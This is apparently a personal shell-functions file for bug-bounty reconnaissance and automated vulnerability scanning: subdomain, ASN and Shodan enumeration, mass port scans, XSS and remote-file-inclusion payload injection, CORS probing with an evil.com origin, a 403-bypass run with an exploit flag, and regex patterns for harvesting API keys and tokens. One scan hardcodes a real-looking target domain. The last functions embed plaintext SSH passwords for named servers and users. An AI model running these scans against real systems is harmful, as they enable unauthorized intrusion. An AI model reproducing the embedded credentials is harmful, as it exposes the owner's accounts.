UserAgent="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"

############### scans

addscope () {
	dir=$(pwd)
	cd ~/system-bounty/scope
	echo "$1" > $(echo "$1" | cut -d "." -f 1)
	cd $dir
	#echo -e "\033[36m[*]\033[0m Added Scope - OK"
}

getfavicon () {
	curl -s https://favhash.fly.dev/get\?favicon\=https\://$1/favicon.ico | egrep -vi "pre|Total|query|result" | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}'
}

getpermut () {
	echo -e "\033[36m[*]\033[0m Fazendo Permutação"
	cat unresolvedsubs | dsieve -f 2 | alterx -silent | anew sub-permut
	cat sub-permut | dsieve -f 3 | alterx -silent | anew sub-permut

	echo -e "\033[36m[*]\033[0m Fazendo Scan dos Permutados"
	naabu -l sub-permut -p 7,9,13,37,53,79,81,88,106,110-111,113,119,135,139,143-144,161,179,199,389,427,444-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3366,3868,3389,3986,4000,4040,4044,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5673,5800,5900,6000-6001,6646,7070,7077,7080,7443,7447,8000,8008-8009,8080-8081,8131,8089,8443,8880,8888,8983,9000,9091,9100,9443,9999-10000,15672,32768,49152-49157,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3333,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8834,9001,9043,9060,9080,9090,9200,9502,9800,9981,10000,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,55672,16161 -silent -nc -o nabuu-result
	cat sub-permut nabuu-result | httpx -silent | anew subdomains-alive

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}

getapi () {
	kr scan $1 -A apiroutes-240528 -o kitrunner-$1
}

getshodan () {
	mkdir shodan && cd shodan
	shodan domain --details $1 --save | anew shodan-preview
	gzip -d *.gz
	jq -cs '.[]' $1-hosts.json | jq '.hostnames[]' | sed -e 's/"//g' | sort -u | anew subdomains-relatives
	jq -cs '.[]' $1-hosts.json | jq '.domains[]' | sed -e 's/"//g' | sort -u | anew domains-relatives
	jq -cs '.[]' $1-hosts.json | jq '.ip_str' | sort -u | sed -e 's/"//g' | grep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' | anew ips-found
	jq -cs '.[]' $1-hosts.json | jq ".org" | sort -u | anew org-name
	jq -cs '.[]' $1-hosts.json | jq ".product" | sort -u | anew product-name
	jq -cs '.[]' $1-hosts.json | jq ".asn" | sort -u | anew asn-shodan
	cd ..
}

getshodanactive () {
	shodan search ssl:$1 --fields ip_str,port | awk '{print $1,$2}' | tr " " ":" | anew ips-ports
	#shodan search org:\"name organization\" \!port:80,443 --fields ip_str,port,http.title | awk '{print $1,$2}' | tr ' ' ':' | anew ips-ports
	#shodan search asn:AS3389 --fields hostnames | tr ";" "\n" | sort -u | anew asn-resolved
}

shodanquery () {
	echo "shodan scan submit --force <IP>"
	echo "shodan search ssl:domain.com --fields ip_str,port,hostnames,org --separator " " | awk '{print $1":"$2" "$3" "$4}' | anew"
	echo "shodan host 192.168.1.1"
	echo "shodan domain hackerone.com"
	echo "shodan alert create “HackerOne” 104.16.100.52"
	echo "shodan alert triggers"
	echo "shodan alert list"
	echo "shodan alert create “Hyatt Hotels” 140.95.0.0/16"
	echo "shodan alert domain hackerone.com"
	echo "shodan alert enable <alert ID> new_service,open_database,vulnerable,ssl_expired,internet_scanner,uncommon"
	echo "shodan search access-control-allow-origin"
	echo "shodan search city:Carapicuíba windows 7"
	echo "shodan search org:tesla"
	echo "shodan search ip:192.68.1.1"
	echo "shodan search http.title index of"
	echo "shodan search http.favicon.hash:1198047028"
	echo "shodan search country:BR camera"
	echo "shodan search country:BR webcam"
	echo "shodan search product:Samsung version:2.0"
	echo "shodan search vuln:CVE-2024-"
	echo "shodan search server:nginx"
	echo "shodan search asn:AS1230"
	echo "shodan search os:windows 7"
	echo "shodan search hostname:tesla.com port:8080"


}

getdork () {
	go-dork -p 30 -q "site:'$1'" -H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +https://www.google.com/bot.html)'
	go-dork -p 30 -q "site:'$1'" -H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +https://www.google.com/bot.html)' | dsieve -f 2:3
}

getip () {
	domain=$(echo $1 | sed -e 's/^http:\/\///' -e 's/^https:\/\///')
	ip=$(ping -c 1 $domain | grep "PING" | cut -d "(" -f 2 | cut -d ")" -f 1)
	echo $ip
}


ipinfo () {
	ipresolved=$(ping -c 1 $1 | grep "PING" | cut -d "(" -f 2 | cut -d ")" -f 1)
	curl "http://ipinfo.io/$ipresolved"
}

minera () {
	python3 ~/hacktools/minera/minera-stable.py

}

############# config

setwallpaperEv () {
	feh --bg-fill ~/Wallpapers/mr-robot-elliot.jpeg &
}




############# scan de ASN

getrange () {
	named=$(echo "$1" | sed 's/.com.*//' | cut -d '.' -f 2)
	echo "\033[35m[*]\033[0m Capturando Ranges"
	curl -s "https://bgpview.io/search/$named#results-v4" -A "GoogleBot" | grep -Po "\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}\/\d." | tr -d '"',">" | anew rangeips
	cat rangeips | mapcidr -silent | hakrevdns -d | anew sub-bgpview
	echo -e "\033[36m[*]\033[0m Separando Dominios Legitimos do escopo"
	xargs -a sub-bgpview -I{} sh -c 'whois {} | grep -Ei "owner:|responsible:" | grep -iq "$namedomain" && echo "{}"' | anew sub-insidescope

	rm -rf sub-bgpview rangeips

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}

getasn () {
	echo -e "\033[36m[*]\033[0m Capturando ASN's"
	namedomain=$(echo "$1" | sed 's/.com.*//' | cut -d '.' -f 2)
	curl -s "https://bgpview.io/search/$namedomain#results-asns" | grep -Po "AS\d.\d{0,6}" | anew asn-unresolved
	echo "\033[35m[*]\033[0m Resolvendo ASN"
	cat asn-unresolved | sed -e 's/AS//g' | sed -e 's/ASN//g' | xargs -I{} curl -s 'https://bgpview.io/asn/{}' -A 'GoogleBot' | grep -Po '\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}\/\d.' | tr -d '"',">" | anew rangeips
	cat asn-unresolved | asnmap -silent | anew rangeips
	cat rangeips | mapcidr -silent | anew ips-asn
	#cat ips-asn | hakrevdns -d | anew sub-bgpview
	cat ips-asn | hakip2host | cut -d " " -f 3 | anew sub-bgpview
	xargs -a sub-bgpview -I{} sh -c 'whois {} | grep -Ei "owner:|responsible:" | grep -iq "$namedomain" && echo "{}"' | anew sub-insidescope
	cat sub-bgpview | anew unresolvedsubs
	naabu -l ips-asn -p 7,9,13,37,53,79,81,88,106,110-111,113,119,135,139,143-144,161,179,199,389,427,444-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3366,3868,3389,3986,4000,4040,4044,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5673,5800,5900,6000-6001,6646,7070,7077,7080,7443,7447,8000,8008-8009,8080-8081,8131,8089,8443,8880,8888,8983,9000,9091,9100,9443,9999-10000,15672,32768,49152-49157,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3333,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8834,9001,9043,9060,9080,9090,9200,9502,9800,9981,10000,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,55672,16161 -silent -nc | anew nabuu-result
	rm -rf asn-unresolved sub-bgpview ips-asn

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}

gethttp () {
	python3 ~/hacktools/HExHTTP/hexhttp.py -u https://$1 -b
}

############# scan de vulnerabilidades


scangraphqldetect () {
	echo -e "\033[35m[*]\033[0m Scan GraphQL"
	cat subdomains-alive | nuclei -id graphql-detect -H $UserAgent -o graphqldetect
}


scanredir () {
	echo -e "\033[35m[*]\033[0m Procurando por Open Redirect"
	cat crawleado | scopein -f scope | nuclei -t ~/nuclei-templates/fuzzing-templates/redirect/open-redirect.yaml -silent -vv | anew open-redirect | notify -silent -id vuln -bulk -mf "Open Redirect Found in: {{{{data}}}} and save in $(pwd)/open-redirect $(date)"
	#se nao rodar o template use o -dast no nuclei

	echo -e "\033[35m[*]\033[0m Procurando por Path Based Redirect"
	cat subdomains-alive | nuclei -t ~/system-bounty/templates-backup/open-redirect.yaml -silent -vv | anew path-based | notify -silent -id vuln -bulk -mf "Path-based found in: {{{{data}}}} e salvo em $(pwd)/path-based $(date)"

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}


scanxss () {
	echo -e "\033[35m[*]\033[0m Buscando por XSS..."
	echo -e "\033[36m[*]\033[0m Metodo 1"
	cat scope | httpx -silent | hakrawler -subs | grep "=" | pvreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v "Not"  anew xss-found | notify -silent -id xss -bulk -mf "XSS Found in: {{{{data}}}} e salvo em $(pwd)/xss-found $(date)"

	echo -e "\033[35m[*]\033[0m Metodo 2"
	cat crawleado | urldedupe -s | grep --color=auto --exclude-dir={.bzr,CVS,.git,.hg,.svn,.idea,.tox} -iEv ".(jpg|png|css|ttf|woff2|woff|eot|svg|txt|xml|pdf|gif)" | gf xss | qsreplace '"><svg onload=confirm(1)>' | grep -E "confirm" | xargs -I{} sh -c "echo '{}' | httpx -silent -mr 'confirm\(1\)'" | anew xss-found | notify -silent -id xss -bulk -mf "XSS Found in: {{{{data}}}} e salvo em $(pwd)/xss-found $(date)"

	echo -e "\033[35m[*]\033[0m Metodo 3"
	cat crawleado | scopein -f scope | grep "=" | pvreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v "Not"  anew xss-found | notify -silent -id xss -bulk -mf "XSS Found in: {{{{data}}}} e salvo em $(pwd)/xss-found $(date)"

	echo -e "\033[35m[*]\033[0m Metodo 4"
	paramspider -l subdomains-alive --stream &>/dev/null | grep 'FUZZ' && rm -rf results | anew param-urls.txt
	cat param-urls.txt | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete

}

scanxssf () {
	echo -e "\033[35m[*]\033[0m Buscando por XSS..."
	cat crawleado | gf blacklist | gf xss | grep "=" | qsreplace '"><script>confirm(1)</script>' | fastxss -payload '<script>confirm(1)' | anew xss-fast | notify -silent -id xss -bulk -mf "XSS Found in: {{{{data}}}} e salvo em $(pwd)/xss-found $(date)"
	#cat crawleado | egrep -iEv "jpg|png|jpeg|css|tif|tiff|ttf|woff2|ico|icon|axd|woff|eot|svg|txt|webp|xml|pdf|gif" | egrep -iaE "q=|s=|search=|lang=|keyword=|query=|page=|keywords=|year=|view=|email=|type=|name=|p=|callback=|jsonp=|api_key=|api=|password=|email=|emailto=|token=|username=|csrf_token=|unsubscribe_token=|id=|item=|page_id=|month=|immagine=|list_type=|url=|terms=|categoryid=|key=|l=|begindate=|enddate=" | grep "=" | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[+] XSS - $host" ; done | anew xss-fast

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}

scancve () {
	echo -e "\033[35m[*]\033[0m Procurando por CVE-2019-11248"
	cat subdomains-alive | nuclei -t ~/nuclei-templates/http/cves/2019/CVE-2019-11248.yaml -silent -vv | anew pprof-vuln | notify -silent -id vuln -bulk -mf "PPROF found in: {{{{data}}}} e salvo em $(pwd)/pprof-vuln $(date)"
	cat crawleado | urldedupe -s | deconstructurl | nuclei -t ~/nuclei-templates/http/cves/2019/CVE-2019-11248.yaml -silent -vv | anew pprof-vuln | notify -silent -id vuln -bulk -mf "pprof found in: {{{{data}}}} e salvo em $(pwd)/pprof-vuln $(date)"

	cat crawleado | nuclei -t ~/nuclei-templates/http/cves/ -silent -vv | anew cves
	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}


scandir () {
	echo -e "\033[35m[*]\033[0m Procurando por Directory Listening"
	cat crawleado | scopein -f scope | deconstructurl | anew paths
	cat paths | httpx -silent -fr -fhr -title -mr "Index of" -t 150 | anew directory-listening | notify -silent -id dir -bulk -mf "Directory Listening found in: {{{{data}}}} e salvo em $(pwd)/directory-listening.new $(date)"
	rm -rf paths

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}


scantakeover () {
	echo -e "\033[35m[*]\033[0m Buscando por Subdomain Takeover... com nuclei"
	cat tech-detect | grep "404" | awk '{print $1}' | nuclei -tags takeover -o takeovers -silent -vv | notify -silent -id vuln -bulk -mf "Subdomain takeover Found in: {{{{data}}}} e salvo em $(pwd)/takeovers $(date)"
	#subzy run --targets ~/recon/vulnweb.com/unresolvedsubs --hide_fails --verify_ssl --concurrency 20 |sort -u
	echo -e "\033[36m[*]\033[0m Buscando subdomain takeover"
	cat subdomains-alive | sed -e 's/http\:\/\//https\:\/\//g' | xargs -I{} sh -c 'subzy run --target {} | grep "VULNERABLE" | grep -v "NOT"' |  anew subdomain-takeover

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}

scanspring () {
	echo -e "\033[35m[*]\033[0m Procurando por SpringBoot"
	nuclei -l subdomains-alive -t ~/nuclei-templates/http/misconfiguration/springboot/springboot-health.yaml -silent -vv | anew spring-found | notify -silent -id vuln -bulk -mf "Springboot Found in: {{{{data}}}} e salvo em $(pwd)/spring-found $(date)"
	#cat subdomains-alive | httpx -silent -path='/actuator/health' -fr -fhr -mr '{\"status\":\"UP\"}' | anew spring-found

	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}


scancache () {
	#encontrar template nuclei, to recebendo falso positivo
	echo -e "\033[36m[*]\033[0m Scan de cache deception"
	#wget https://raw.githubusercontent.com/PortSwigger/param-miner/master/resources/headers 2>/dev/null
	nuclei -l subdomains-alive -tags cache -silent | anew cache-detectado | notify -silent -id vuln -bulk -mf "Possible Cache Deception in: {{{{data}}}} e salvo em $(pwd)/cache-detect $(date)"


	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}


scancors () {
	echo -e "\033[35m[*]\033[0m Procurando por CORS"
	cat subdomains-alive | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/cors-misconfig.yaml -silent -vv | anew cors-found | notify -silent -id scan -bulk -mf "Cors found in: {{{{data}}}} e salvo em $(pwd)/cors-found $(date)"
	while IFS= read -r subdomain; do url="$subdomain"; payloads=("evil.com" "https://$(openssl rand -hex 3).com" "https://$(openssl rand -hex 3)$RANDOM.com" "https://example.com.$(openssl rand -hex 3).com" "https://example$(openssl rand -hex 3).com" "https://example_$(openssl rand -hex 3).com" "https://example%60$(openssl rand -hex 3).com" "null" "https://$(openssl rand -hex 3).example" "http://$(openssl rand -hex 3).example" "https://example$(openssl rand -hex 3).example.com" "http://example$(openssl rand -hex 3).example.com"); for payload in "${payloads[@]}"; do echo "Testing $url with Origin: $payload"; curl -s -I -H "Origin: $payload" -X GET "$url" | grep -i "access-control-allow-origin: $payload" && echo "Potential CORS Found: $url with Origin: $payload"; done; done < subdomains-alive | grep "Potential" | anew cors-found
	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete
}

scanjs () {
	cat js-found | nuclei -t ~/nuclei-templates/file/js/js-analyse.yaml | anew secret-token | notify -silent -id vuln -bulk -mf "Possible secret find in: {{{data}}} e salvo em $(pwd)/secret-token"
	cat js-found | nuclei -t ~/nuclei-templates/http/exposures/ -silent | anew secret-token
	python3 ~/hacktools/SecretFinder/SecretFinder.py -i js-found -o cli | anew secret-token
	python3 ~/hacktools/SecretFinder/SecretFinder.py -i subdomains-alive -o cli | anew secret-token
}

scanspf () {
	xargs -a subdomains-alive -I{} sh -c 'host -t TXT {} 2>/dev/null | grep -i "v=spf1" | egrep -iqE "~all| ?all" && echo "{} \033[31m[*] Vulnerável, Possível SPF incorreto\033[0m" || echo "{} \033[36m[*]Não vulnerável\033[0m"'
	find . -type f -size 0 -delete
}


scanparampolution () {

	echo -e "\033[35m[*]\033[0m refletindo parametro adicional"
	cat crawleado | grep "solarbr.com.br" | gf xss | egrep --color=auto -iv ".(jpg|png|css|ttf|woff2|woff|eot|svg|txt|xml|pdf|gif|.js|.xhtml|.html|.aspx|.asp)" | xargs -I@ sh -c "echo '@%26qualquercoisa=1'"| httpx -mr 'qualquercoisa' 
}

scangitexposed () {
	xargs -a subdomains-alive -I@ sh -c "echo @ | httpx -path '.git/config' -mr core -silent" | anew git-exposed
}

scanlfi () {
	cat crawleado | scopein -f scope | gf lfi | cut -d "=" -f 1 | awk '{print $1"="}' | uniq | nuclei -tags lfi -silent | anew lfi-found

}

scanrfi () {
	cat crawleado | scopein -f scope | cut -d "=" -f 1 | awk '{print $1"="}' | egrep --color=auto --exclude-dir={.bzr,CVS,.git,.hg,.svn,.idea,.tox} -iEv ".txt=|.aspx=|.js=|/=|.php=|.html=|.asp=|.br=|.mp4=|.com=|.css=|.co=|.gif=|.png=|.jpg=|.jpeg=" | anew | pvreplace "https://pastebin.com/5sXhMV11" | while read host;do curl -i -s -k "$host" | grep "<title>hello\ world" 1>/dev/null && echo "\033[31m [ * ] $host - VULNERABLE";done | anew rfi-found
}



scanbypass403 () {
	echo -e "\033[36m[*]\033[0m detectando 403"
	cat crawleado | scopein -f scope | sed -e 's/https\:\/\///g' | httpx -status-code -mc 403 -silent -timeout 3 | anew so403
	cat so403 | awk {'print $1'} | anew test403
	cat test403 | xargs -I{} sh -c 'bash ~/hacktools/4-zero-3.sh -u {} --exploit' | anew 403-analyse
	rm -rf test403
	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
	find . -type f -size 0 -delete

}


secrets () {

  echo "[ + ] Checking for basic auth..."
  grep -HnriEo 'basic [a-zA-Z0-9=:+/-]{5,100}' .

  echo "[ + ] Checking for Google Cloud or Maps Api..."
  grep -HnriEo 'AIza[0-9A-Za-z\-]{35}' .

  echo "[ + ] Checking Slack webhooks..."
  grep -HnriEo 'https://hooks.slack.com/services/T[a-zA-Z0-9]{8}/B[a-zA-Z0-9]{8}/[a-zA-Z0-9]{24}' .

  echo "[ + ] Checking Aws Access Key..."
  grep -HnriEo 'AKIA[0-9A-Z]{16}' .

  echo "[ + ] Checking Bearer auth..."
  grep -HnriEo 'bearer [a-zA-Z0-9\-\.=]+' .

  echo "[ + ] Checking Cloudinary auth key..."
  grep -HnriEo 'cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+' .

  echo "[ + ] Checking Mailgun api key..."
  grep -HnriEo 'key-[0-9a-zA-Z]{32}' .

  echo "[ + ] Checking for Api key parameters..."
  grep -HnriEo "(api_key|API_KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .
  grep -HnriEo "(api-key|API-KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .
  grep -HnriEo "(apikey|APIKEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for access keys..."
  grep -HnriEo "(access_key|ACCESS_KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for access token..."
  grep -HnriEo "(access_token|ACCESSTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for Bearer Token..."
  grep -HnriEo 'bearer [a-zA-Z0-9-.=:_+/]{5,100}' .

  echo "[ + ] Checking for auth token..."
  grep -HnriEo "(auth_token|AUTH_TOKEN)" .

  echo "[ + ] Checking for slack api..."
  grep -HnriEo "(slack_api|SLACK_API)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for db password or username..."
  grep -HnriEo "(db_password|DB_PASSWORD)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .
  grep -HnriEo "(db_username|DB_USERNAME)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for authorization tokens..."
  grep -HnriEo "(authorizationToken|AUTHORIZATIONTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for app key ..."
  grep -HnriEo "(app_key|APPKEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for authorization ..."
  grep -HnriEo "(authorization|AUTHORIZATION)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for authentication ..."
  grep -HnriEo "(authentication|AUTHENTICATION)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .

  echo "[ + ] Checking for aws links, buckets and secrets..."
  grep -HnriEo "(.{8}[A-z0-9-].amazonaws.com/)[A-z0-9-].{6}" .
  grep -HnriEo "(.{8}[A-z0-9-].s3.amazonaws.com/)[A-z0-9-].{6}" .
  grep -HnriEo "(.{8}[A-z0-9-].s3-amazonaws.com/)[A-z0-9_-].{6}" .
  grep -HnriEo 'amzn.mws.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' .
  grep -HnriEo "(amazonaws|AMAZONAWS)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}" .
  grep -HnriEo "(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z/+]{40}['\"]" .

}

scancrlf () {
	cat subdomains-alive | crlfuzz 2>/dev/null | grep -v "ERR" && echo "{} \033[31m[*] Vulnerável, CRLF Injection\033[0m" | anew crlf-vulnerable
	echo -e "\033[36m[*]\033[0m Removendo arquivos vazios"
        find . -type f -size 0 -delete
}


scanvuln () {
	scangraphqldetect
	scanxss
	scancve
	scandir
	scantakeover
	scanspring
	scancache
	scancors
	scanjs
	scanspf
	scanparampolution
	scangitexposed
	scanlfi
	scanrfi
	scanbypass403
	scancrlf
}

########### Autentication VPS


vaporhole () {
	sshpass -p '59eabf3a0dd899f528829c387009c5ce' ssh -p 7990 al4xs@vaporhole.xyz 
}
tildeteam () {
	sshpass -p 'Prosperidade7@' ssh al4xs@tilde.team
}

meuserver () {
	sshpass -p '240193' ssh micha@192.168.10.173
}

updatetools () {
	nuclei -up -ut -ud ~/nuclei-templates/
	httpx -update
	searchsploit -u
	naabu -up

}
